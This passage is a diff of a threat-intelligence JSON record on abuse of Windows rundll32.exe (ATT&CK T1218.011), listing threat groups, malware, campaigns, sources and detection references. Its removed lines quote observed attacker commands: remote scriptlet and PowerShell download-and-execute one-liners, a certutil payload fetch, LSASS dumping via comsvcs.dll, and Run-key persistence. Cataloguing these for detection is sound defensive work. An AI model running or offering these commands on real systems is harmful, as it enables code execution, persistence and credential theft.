@@ -1,237 +1,1548 @@
 {
   "type": "lolbin",
-  "version": 1,
+  "version": 2,
   "id": "26779D1E-D441-4562-AD09-4ECC9B36121E",
   "created_by_ref": "@Nounou_Mbeiri",
-  "created": "2023-09-T00:00",
-  "modified": "2023-08-17T00:00",
+  "created": "2023-09-26T19:59:11.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
   "name": "rundll32.exe",
+  "image": "rundll32.exe",
   "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.",
-  "Required_privilege": [
+  "attack": {
+    "id": "T1218.011",
+    "name": "Rundll32",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1218/011",
+    "version": "20.0"
+  },
+  "summary": [
+    "Execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools",
+    "Establish persistence within Registry Run Keys / Startup Folder entries to execute malicious DLLs",
+    "Execute an initial infection process and launch a malicious DLL",
+    "Load a malicious DLL",
+    "Execute the Cobalt Strike Beacon loader DLL",
+    "Execute commands and scripts"
+  ],
+  "required_privileges": [
     "User"
   ],
   "paths": [
     "c:\\windows\\system32\\rundll32.exe",
     "c:\\windows\\syswow64\\rundll32.exe"
   ],
-  "hashe": "10F08638E7C04D15BA4B4A740087A826",
-  "associated_kill_chain_phases": [
-    "TA0004:Privilege Escalation:T1548.002",
-    "TA0006:Persis Credential Accesstence:T1555.004,T1003.001",
-    "TA0005:Defense Evasion:T1218.011"
-  ],
+  "hashes": {
+    "MD5": "10F08638E7C04D15BA4B4A740087A826"
+  },
   "capabilities": [
     "Alternate data streams",
     "Execute"
   ],
-  "relationship": [
-    {
-      "associated_apts": [
-        "Briba",
-        "NOKKI",
-        "GreyEnergy",
-        "Egregor",
-        "Elise",
-        "Kwampirs",
-        "Sakula",
-        "Flame",
-        "NativeZone",
-        "SDBbot",
-        "Backdoor.Oldrea",
-        "EnvyScout",
-        "HermeticWizard",
-        "BoomBox",
-        "Emissary",
-        "Squirrelwaffle",
-        "ServHelper",
-        "USBferry",
-        "PowerDuke",
-        "EVILNUM",
-        "FunnyDream",
-        "CozyCar",
-        "CORESHELL",
-        "Comnie",
-        "ADVSTORESHELL",
-        "DDKONG",
-        "QakBot",
-        "Mongall",
-        "InvisiMole",
-        "Matryoshka",
-        "Bisonal",
-        "gh0st RAT",
-        "Ragnar Locker",
-        "Prikormka",
-        "SUNBURST",
-        "DEADEYE",
-        "SVCReady",
-        "FlawedAmmyy",
-        "JHUHUGIT",
-        "StreamEx",
-        "ZxShell",
-        "BLINDINGCAN",
-        "Cobalt Strike",
-        "NotPetya",
-        "FatDuke",
-        "Attor",
-        "PolyglotDuke",
-        "RTM",
-        "Mosquito",
-        "Winnti for Windows",
-        "Bad Rabbit",
-        "KONNI",
-        "Heyoka Backdoor",
-        "Sibot",
-        "Bumblebee",
-        "Pteranodon",
-        "PUNCHBUGGY",
-        "FELIXROOT",
-        "MegaCortex"
-      ],
-      "Relationship Malware->Tools": [
-        "[Briba](https://attack.mitre.org/software/S0204) uses rundll32 within [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) entries to execute malicious DLLs.(Citation: Symantec Briba May 2012)",
-        "[NOKKI](https://attack.mitre.org/software/S0353) has used rundll32 for execution.(Citation: Unit 42 NOKKI Sept 2018)",
-        "[GreyEnergy](https://attack.mitre.org/software/S0342) uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).(Citation: ESET GreyEnergy Oct 2018)",
-        "[Egregor](https://attack.mitre.org/software/S0554) has used rundll32 during execution.(Citation: Cybereason Egregor Nov 2020)",
-        "After copying itself to a DLL file, a variant of [Elise](https://attack.mitre.org/software/S0081) calls the DLL file using rundll32.exe.(Citation: Lotus Blossom Jun 2015)",
-        "[Kwampirs](https://attack.mitre.org/software/S0236) uses rundll32.exe in a Registry value added to establish persistence.(Citation: Symantec Orangeworm April 2018)",
-        "[Sakula](https://attack.mitre.org/software/S0074) calls cmd.exe to run various DLL files via rundll32.(Citation: Dell Sakula)",
-        "Rundll32.exe is used as a way of executing [Flame](https://attack.mitre.org/software/S0143) at the command-line.(Citation: Crysys Skywiper)",
-        "[NativeZone](https://attack.mitre.org/software/S0637) has used rundll32 to execute a malicious DLL.(Citation: SentinelOne NobleBaron June 2021)",
-        "[SDBbot](https://attack.mitre.org/software/S0461) has used rundll32.exe to execute DLLs.(Citation: Korean FSI TA505 2020)",
-        "[Backdoor.Oldrea](https://attack.mitre.org/software/S0093) can use rundll32 for execution on compromised hosts.(Citation: Gigamon Berserk Bear October 2021)",
-        "[EnvyScout](https://attack.mitre.org/software/S0634) has the ability to proxy execution of malicious files with Rundll32.(Citation: MSTIC Nobelium Toolset May 2021)",
-        "[HermeticWizard](https://attack.mitre.org/software/S0698) has the ability to create a new process using `rundll32`.(Citation: ESET Hermetic Wizard March 2022)",
-        "[BoomBox](https://attack.mitre.org/software/S0635) can use RunDLL32 for execution.(Citation: MSTIC Nobelium Toolset May 2021)",
-        "Variants of [Emissary](https://attack.mitre.org/software/S0082) have used rundll32.exe in Registry values added to establish persistence.(Citation: Emissary Trojan Feb 2016)",
-        "[Squirrelwaffle](https://attack.mitre.org/software/S1030) has been executed using `rundll32.exe`.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021)",
-        "[ServHelper](https://attack.mitre.org/software/S0382) contains a module for downloading and executing DLLs that leverages <code>rundll32.exe</code>.(Citation: Deep Instinct TA505 Apr 2019)",
-        "[USBferry](https://attack.mitre.org/software/S0452) can execute rundll32.exe in memory to avoid detection.(Citation: TrendMicro Tropic Trooper May 2020)",
-        "[PowerDuke](https://attack.mitre.org/software/S0139) uses rundll32.exe to load.(Citation: Volexity PowerDuke November 2016)",
-        "[EVILNUM](https://attack.mitre.org/software/S0568) can execute commands and scripts through rundll32.(Citation: Prevailion EvilNum May 2020) ",
-        "[FunnyDream](https://attack.mitre.org/software/S1044) can use `rundll32` for execution of its components.(Citation: Bitdefender FunnyDream Campaign November 2020)",
-        "The [CozyCar](https://attack.mitre.org/software/S0046) dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main [CozyCar](https://attack.mitre.org/software/S0046) component.(Citation: F-Secure CozyDuke)",
-        "[CORESHELL](https://attack.mitre.org/software/S0137) is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"(Citation: Microsoft SIR Vol 19)",
-        "[Comnie](https://attack.mitre.org/software/S0244) uses Rundll32 to load a malicious DLL.(Citation: Palo Alto Comnie)",
-        "[ADVSTORESHELL](https://attack.mitre.org/software/S0045) has used rundll32.exe in a Registry value to establish persistence.(Citation: Bitdefender APT28 Dec 2015)",
-        "[DDKONG](https://attack.mitre.org/software/S0255) uses Rundll32 to ensure only a single instance of itself is running at once.(Citation: Rancor Unit42 June 2018)",
-        "[QakBot](https://attack.mitre.org/software/S0650) has used Rundll32.exe to drop malicious DLLs including [Brute Ratel C4](https://attack.mitre.org/software/S1063) and to enable C2 communication.(Citation: Crowdstrike Qakbot October 2020)(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot May 2021)(Citation: ATT QakBot April 2021)(Citation: Trend Micro Black Basta October 2022)",
-        "[Mongall](https://attack.mitre.org/software/S1026) can use `rundll32.exe` for execution.(Citation: SentinelOne Aoqin Dragon June 2022)",
-        "[InvisiMole](https://attack.mitre.org/software/S0260) has used rundll32.exe for execution.(Citation: ESET InvisiMole June 2020)",
-        "[Matryoshka](https://attack.mitre.org/software/S0167) uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.(Citation: CopyKittens Nov 2015)",
-        "[Bisonal](https://attack.mitre.org/software/S0268) has used rundll32.exe to execute as part of the Registry Run key it adds: <code>HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”</code>.(Citation: Unit 42 Bisonal July 2018)",
-        "A [gh0st RAT](https://attack.mitre.org/software/S0032) variant has used rundll32 for execution.(Citation: Arbor Musical Chairs Feb 2018)",
-        "[Ragnar Locker](https://attack.mitre.org/software/S0481) has used rundll32.exe to execute components of VirtualBox.(Citation: Sophos Ragnar May 2020)",
-        "[Prikormka](https://attack.mitre.org/software/S0113) uses rundll32.exe to load its DLL.(Citation: ESET Operation Groundbait)",
-        "[SUNBURST](https://attack.mitre.org/software/S0559) used Rundll32 to execute payloads.(Citation: Microsoft Deep Dive Solorigate January 2021) ",
-        "[DEADEYE](https://attack.mitre.org/software/S1052) can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.(Citation: Mandiant APT41)",
-        "[SVCReady](https://attack.mitre.org/software/S1064) has used `rundll32.exe` for execution.(Citation: HP SVCReady Jun 2022)",
-        "[FlawedAmmyy](https://attack.mitre.org/software/S0381) has used `rundll32` for execution.(Citation: Korean FSI TA505 2020)",
-        "[JHUHUGIT](https://attack.mitre.org/software/S0044) is executed using rundll32.exe.(Citation: F-Secure Sofacy 2015)(Citation: Talos Seduploader Oct 2017)",
-        "[StreamEx](https://attack.mitre.org/software/S0142) uses rundll32 to call an exported function.(Citation: Cylance Shell Crew Feb 2017)",
-        "[ZxShell](https://attack.mitre.org/software/S0412) has used rundll32.exe to execute other DLLs and named pipes.(Citation: Talos ZxShell Oct 2014) ",
-        "[Sibot](https://attack.mitre.org/software/S0589) has executed downloaded DLLs with <code>rundll32.exe</code>.(Citation: MSTIC NOBELIUM Mar 2021)"
-      ],
-      "Relationship APTs->Tools": [
-        "[APT28](https://attack.mitre.org/groups/G0007) executed [CHOPSTICK](https://attack.mitre.org/software/S0023) by using rundll32 commands such as <code>rundll32.exe “C:\\Windows\\twain_64.dll”</code>. [APT28](https://attack.mitre.org/groups/G0007) also executed a .dll for a first stage dropper using rundll32.exe. An [APT28](https://attack.mitre.org/groups/G0007) loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.(Citation: Crowdstrike DNC June 2016)(Citation: Bitdefender APT28 Dec 2015)(Citation: Palo Alto Sofacy 06-2018)(Citation: Unit 42 Playbook Dec 2017)(Citation: ESET Zebrocy May 2019)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021)",
-        "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has executed custom-compiled XMRIG miner DLLs using rundll32.exe.(Citation: RedCanary Mockingbird May 2020)",
-        "[Kimsuky](https://attack.mitre.org/groups/G0094) has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.(Citation: Talos Kimsuky Nov 2021)",
-        "[Sandworm Team](https://attack.mitre.org/groups/G0034) used a backdoor which could execute a supplied DLL using rundll32.exe.(Citation: ESET Telebots July 2017)",
-        "[Lazarus Group](https://attack.mitre.org/groups/G0032) has used rundll32 to execute malicious payloads on a compromised host.(Citation: ESET Twitter Ida Pro Nov 2021)",
-        "[TA551](https://attack.mitre.org/groups/G0127) has used rundll32.exe to load malicious DLLs.(Citation: Unit 42 TA551 Jan 2021)",
-        "[TA505](https://attack.mitre.org/groups/G0092) has leveraged <code>rundll32.exe</code> to execute malicious DLLs.(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019)",
-        "[APT3](https://attack.mitre.org/groups/G0022) has a tool that can run DLLs.(Citation: FireEye Clandestine Fox)",
-        "[APT19](https://attack.mitre.org/groups/G0073) configured its payload to inject into the rundll32.exe.(Citation: FireEye APT19)",
-        "[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.(Citation: Securelist MuddyWater Oct 2018)",
-        "[APT41](https://attack.mitre.org/groups/G0096) has used rundll32.exe to execute a loader.(Citation: Crowdstrike GTR2020 Mar 2020)",
-        "[CopyKittens](https://attack.mitre.org/groups/G0052) uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.(Citation: ClearSky Wilted Tulip July 2017)",
-        "[Carbanak](https://attack.mitre.org/groups/G0008) installs VNC server software that executes through rundll32.(Citation: Kaspersky Carbanak)",
-        "[APT32](https://attack.mitre.org/groups/G0050) malware has used rundll32.exe to execute an initial infection process.(Citation: Cybereason Cobalt Kitty 2017)",
-        "[Magic Hound](https://attack.mitre.org/groups/G0059) has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.(Citation: DFIR Report APT35 ProxyShell March 2022)",
-        "[Gamaredon Group](https://attack.mitre.org/groups/G0047) malware has used rundll32 to launch additional malicious components.(Citation: ESET Gamaredon June 2020)",
-        "[HAFNIUM](https://attack.mitre.org/groups/G0125) has used <code>rundll32</code> to load malicious DLLs.(Citation: Volexity Exchange Marauder March 2021)",
-        "[LazyScripter](https://attack.mitre.org/groups/G0140) has used `rundll32.exe` to execute [Koadic](https://attack.mitre.org/software/S0250) stagers.(Citation: MalwareBytes LazyScripter Feb 2021) ",
-        "[APT38](https://attack.mitre.org/groups/G0082) has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.(Citation: CISA AA20-239A BeagleBoyz August 2020)"
-      ],
-      "associated_campaigns": [
-        "C0021",
-        "SolarWinds Compromise",
-        "Operation Spalax",
-        "Operation Dream Job",
-        "C0018",
-        "C0015"
-      ],
-      "associated_commands": [
-        "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:hxxps[:]//www[.]example[.]com/malicious.sct\")",
-        "RUNDLL32.EXE \\“C:\\Documents and Settings\\<user-name>\\Local Settings\\Application Data\\Microsoft Help\\advstorshell.dll\\”, InitW",
-        "C:\\Windows\\System32\\rundll32.exe c:\\windows\\system32\\advpack.dll,RegisterOCX BOOM.exe",
-        "rundll32.exe “C:\\Windows\\twain_64.dll",
-        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID",
-        "rundll32.exe keymgr.dll KRShowKeyMgr",
-        "rundll32 PowerShdll.dll,main . { iwr -useb hxxps://website.com/Script.ps1 } ^| iex;",
-        "rundll32 C:\\ProgramData\\PShdll35.dll,main -f C:\\ProgramData\\doutlook.ps1",
-        "cmd.exe /c “C:\\Windows\\System32\\rundll32.exe “C:\\Sun\\Thumbs.db”,#1 CAIAABBmAAAgAAAA8GFGvkHVGDtGRqcl3Z3nYJ9aXCm7TVZX8klEdjacOSU=”",
-        "cmd.exe /c start /wait \"\" \"C:\\Users\\[removed]\\AppData\\Local\\Temp\\ATTACHME.LNK\" rundll32.exe \"C:\\Windows\\System32\\rundll32.exe\", Attachments.dat,IternalJob",
-        "C:\\Windows\\conhost.exe \\%TARGET-HOST% -accepteula -s -d C:\\Windows\\ System32\\rundll32.exe “C:\\Windows\\msvcrt120b.dll”, #1 %TIMEOUT% “USER1:PASSWORD1;USER2:PASSWORD2” “%DECRYPTIONKEY%”",
-        "HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”",
-        "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\iconcache.db,SMain S-6-12-2371-68143633-837395-7851",
-        "rundll32.exe\" C:\\Users\\dmaddux:temp.dll,Start",
-        "C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,ShellExec_RunDLL C:\\Windows\\System32\\cmd.exe /k certutil -urlcache -split -f hxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe",
-        "rundll32 C:\\users\\public\\Name-123456.xls,DllRegisterServer",
-        "rundll32.exe \"%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll\",#1 687474703A2F2F[REDACTED]\"\" dir /s /b /o:gn %APPDATA%\\Microsoft",
-        "RUNDLL32.EXE comsvcs.dll |dumped LSAS"
-      ],
-      "pre_and_next_related_cmd": [
-        {
-          "pre_cmd_event": [
-            "reg add \"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\" /ve /d \"Reliability Maintenance Control Panel\" /reg:64 /f&&reg add \"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\\InProcServer32\" /ve /d \"%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll\" /reg:64 /f&&reg add \"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\\InProcServer32\" /v \"ThreadingModel\" /t REG_SZ /d \"Both\" /reg:64 /f",
-            "wscript.exe CSIDL_COMMON_APPDATA\\e147c18f9167cd0f\\f30b25c870238567.vbs"
-          ],
-          "next_cmd_event": [
-            "regsvr32.exe /s dialogex.dll",
-            "tasklist /s <REDACTED> net group \"domain admins\" /dom net localgroup \"administrator\" nltest /domain_trusts /all_trusts net view /all /domain net view / ll time"
-          ]
-        }
-      ]
-    }
-  ],
   "platforms": [
     "windows"
   ],
-  "detections": [
-    {
-      "eventsid": [
-        {
-          "sysmon": [
-            "T1218.011:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1"
-          ],
-          "windows": [
-            "T1218.011:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
-            "T1218.011:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4103"
-          ]
-        }
-      ],
-      "sigma_rules": [
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_rundll32_inline_vbs.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_rundll32_script_run.yml",
-        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
-      ],
-      "other_rules": [
-        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/rundll32_control_rundll_hunt.yml",
-        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/execution_command_shell_via_rundll32.toml"
-      ]
-    }
+  "associated_kill_chain_phases": [
+    "TA0005:Stealth:T1218.011",
+    "TA0004:Privilege Escalation:T1548.002",
+    "TA0006:Credential Access:T1555.004",
+    "TA0006:Credential Access:T1003.001"
   ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT19",
+        "attack_id": "G0073",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "APT19 configured its payload to inject into the rundll32.exe.",
+        "sources": "FireEye APT19 https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
+      },
+      {
+        "name": "APT28",
+        "attack_id": "G0007",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe “C:\\Windows\\twain_64.dll”. APT28 also executed a.dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.",
+        "sources": "Crowdstrike DNC June 2016 https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/; Bitdefender APT28 Dec 2015 https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf; ESET Zebrocy May 2019 https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/; Palo Alto Sofacy 06-2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/; Cybersecurity Advisory GRU Brute Force Campaign July 2021 https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF; Unit 42 Playbook Dec 2017 https://web.archive.org/web/20230702043312/https://pan-unit42.github.io/playbook_viewer/"
+      },
+      {
+        "name": "APT3",
+        "attack_id": "G0022",
+        "evidence": "uses T1218.011",
+        "description": "APT3 has a tool that can run DLLs.",
+        "sources": "FireEye Clandestine Fox https://www.fireeye.com/blog/threat-research/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html"
+      },
+      {
+        "name": "APT32",
+        "attack_id": "G0050",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "APT32 malware has used rundll32.exe to execute an initial infection process. APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.",
+        "sources": "Cybereason Cobalt Kitty 2017 https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "name": "APT38",
+        "attack_id": "G0082",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools. APT38 has renamed system utilities, such as `rundll32.exe` and `mshta.exe`, to avoid detection.",
+        "sources": "CISA AA20-239A BeagleBoyz August 2020 https://us-cert.cisa.gov/ncas/alerts/aa20-239a; 1 - appv https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+      },
+      {
+        "name": "APT41",
+        "attack_id": "G0096",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "APT41 has used rundll32.exe to execute a loader.",
+        "sources": "Crowdstrike GTR2020 Mar 2020 https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+      },
+      {
+        "name": "Aquatic Panda",
+        "attack_id": "G0143",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Aquatic Panda used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary.",
+        "sources": "Crowdstrike HuntReport 2022 https://go.crowdstrike.com/rs/281-OBQ-266/images/2022OverWatchThreatHuntingReport.pdf"
+      },
+      {
+        "name": "Blue Mockingbird",
+        "attack_id": "G0108",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.",
+        "sources": "RedCanary Mockingbird May 2020 https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "name": "Carbanak",
+        "attack_id": "G0008",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Carbanak installs VNC server software that executes through rundll32.",
+        "sources": "Kaspersky Carbanak https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+      },
+      {
+        "name": "CopyKittens",
+        "attack_id": "G0052",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.",
+        "sources": "ClearSky Wilted Tulip July 2017 http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf"
+      },
+      {
+        "name": "Daggerfly",
+        "attack_id": "G1034",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Daggerfly proxied execution of malicious DLLs through a renamed rundll32.exe binary. Daggerfly used a renamed version of rundll32.exe, such as \"dbengin.exe\" located in the `ProgramData\\Microsoft\\PlayReady` directory, to proxy malicious DLL execution.",
+        "sources": "Symantec Daggerfly 2023 https://symantec-enterprise-blogs.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
+      },
+      {
+        "name": "FIN7",
+        "attack_id": "G0046",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "FIN7 has used `rundll32.exe` to execute malware on a compromised network.",
+        "sources": "Mandiant FIN7 Apr 2022 https://www.mandiant.com/resources/evolution-of-fin7"
+      },
+      {
+        "name": "Gamaredon Group",
+        "attack_id": "G0047",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Gamaredon Group malware has used rundll32 to launch additional malicious components.",
+        "sources": "ESET Gamaredon June 2020 https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/"
+      },
+      {
+        "name": "HAFNIUM",
+        "attack_id": "G0125",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "HAFNIUM has used rundll32 to load malicious DLLs.",
+        "sources": "Volexity Exchange Marauder March 2021 https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Kimsuky has used `rundll32.exe` to execute malicious scripts and malware on a victim's network.",
+        "sources": "Talos Kimsuky Nov 2021 https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html; Aryaka Kimsuky July 2025 https://www.aryaka.com/docs/reports/aryaka-kimsuky-apt-operational-blueprint.pdf"
+      },
+      {
+        "name": "Lazarus Group",
+        "attack_id": "G0032",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.",
+        "sources": "ESET Twitter Ida Pro Nov 2021 https://x.com/ESETresearch/status/1458438155149922312"
+      },
+      {
+        "name": "LazyScripter",
+        "attack_id": "G0140",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "LazyScripter has used `rundll32.exe` to execute Koadic stagers.",
+        "sources": "MalwareBytes LazyScripter Feb 2021 https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+      },
+      {
+        "name": "Magic Hound",
+        "attack_id": "G0059",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.",
+        "sources": "DFIR Report APT35 ProxyShell March 2022 https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell"
+      },
+      {
+        "name": "MuddyWater",
+        "attack_id": "G0069",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a.dll.",
+        "sources": "Securelist MuddyWater Oct 2018 https://securelist.com/muddywater/88059/"
+      },
+      {
+        "name": "RedCurl",
+        "attack_id": "G1039",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "RedCurl has used rundll32.exe to execute malicious files.",
+        "sources": "group-ib_redcurl1 https://www.group-ib.com/resources/research-hub/red-curl/; group-ib_redcurl2 https://www.group-ib.com/resources/research-hub/red-curl-2/; trendmicro_redcurl https://www.trendmicro.com/en_us/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html"
+      },
+      {
+        "name": "Sandworm Team",
+        "attack_id": "G0034",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.",
+        "sources": "ESET Telebots July 2017 https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"
+      },
+      {
+        "name": "Storm-0501",
+        "attack_id": "G1053",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Storm-0501 has launched Cobalt Strike Beacon files with rundll32.exe.",
+        "sources": "Microsoft Storm-501 Sabbath Ransomware Embargo September 2024 https://www.microsoft.com/en-us/security/blog/2024/09/26/storm-0501-ransomware-attacks-expanding-to-hybrid-cloud-environments/"
+      },
+      {
+        "name": "TA505",
+        "attack_id": "G0092",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "TA505 has leveraged rundll32.exe to execute malicious DLLs.",
+        "sources": "Cybereason TA505 April 2019 https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware; Deep Instinct TA505 Apr 2019 https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+      },
+      {
+        "name": "TA551",
+        "attack_id": "G0127",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "TA551 has used rundll32.exe to load malicious DLLs.",
+        "sources": "Unit 42 TA551 Jan 2021 https://unit42.paloaltonetworks.com/ta551-shathak-icedid/"
+      },
+      {
+        "name": "UNC3886",
+        "attack_id": "G1048",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "UNC3886 has used rundll32.exe to execute MiniDump for dumping LSASS process memory.",
+        "sources": "Google Cloud Threat Intelligence ESXi VIBs 2022 https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence"
+      },
+      {
+        "name": "VOID MANTICORE",
+        "attack_id": "G1055",
+        "evidence": "names rundll32.exe",
+        "description": "VOID MANTICORE has dumped LSASS credentials using `comsvcs.dll` via `rundll32.exe`.",
+        "sources": "Check Point VOID MANTICORE Handala Hack March 2026 https://research.checkpoint.com/2026/handala-hack-unveiling-groups-modus-operandi/"
+      },
+      {
+        "name": "Wizard Spider",
+        "attack_id": "G0102",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Wizard Spider has utilized `rundll32.exe` to deploy ransomware commands with the use of WebDAV.",
+        "sources": "Mandiant FIN12 Oct 2021 https://web.archive.org/web/20220313061955/https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "2015 Ukraine Electric Power Attack",
+        "attack_id": "C0028",
+        "evidence": "uses T1218.011; names rundll32.exe",
